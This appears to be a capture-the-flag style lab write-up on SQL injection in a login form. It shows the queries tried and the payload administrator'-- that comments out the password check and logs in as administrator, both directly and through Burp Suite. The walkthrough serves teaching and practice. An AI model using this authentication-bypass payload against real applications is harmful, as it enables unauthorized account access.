This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the **administrator** user.
<br>

**Exploit:**<br>
We are given a home page having products and Home and My Account buttons.
![alt text](/images/lab2homepage.png)

We have a login form in myaccount page.
![alt text](/images/lab2loginpage.png)

We need to login as ```administrator``` user. We insert payload in login form. We use following query. <br>
- ```select username from users where user='administrator' and password='admin or something'```
this will give internal server error
- ```select username from users where user=''' and password='admin or something'``` we pass ```'``` in username field to detect anomalies. Still nothing.
- ```select username from users where user='administrator'-- and password='admin or something'``` we comment out password part by passing ```administrator'--``` in username field. And lab was solved.
![alt text](/images/lab2payload.png)



We can also easily do this lab by using Burpsuite. Just pass ```administrator'--``` as parameter to login field. ```/login?username=```
![alt text](/images/lab2burp.png)